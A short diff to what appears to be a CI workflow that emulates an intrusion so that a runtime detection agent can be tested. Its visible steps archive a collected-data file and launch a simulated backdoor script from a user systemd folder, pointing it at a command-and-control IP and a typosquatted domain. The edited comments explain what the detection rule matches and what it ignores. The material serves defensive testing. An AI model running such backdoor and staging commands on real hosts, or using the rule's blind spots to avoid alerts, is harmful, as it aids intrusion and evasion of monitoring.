@@ -50,8 +50,9 @@ runs:
         tar czf "${HOME}/tpcp.tar.gz" -C "${HOME}" dac-collected.txt
 
         # 4) Backdoor process (DAC-0004): run sysmon.py with the C2 IP and domain
-        #    as arguments. This invocation carries the IoC tokens (the sysmon.py
-        #    path and 45.148.10.212) in its argv, which is what the exec rule matches.
+        #    as arguments. The exec rule matches the process comm (sysmon.py) or the
+        #    C2 IP 45.148.10.212 in argv; it deliberately ignores the file path, so
+        #    the chmod above does not alert.
         "${HOME}/.config/systemd/user/sysmon.py" --c2 45.148.10.212 --host scan.aquasecurtiy.org || true
 
         # Keep the container alive briefly so node-agent processes the events
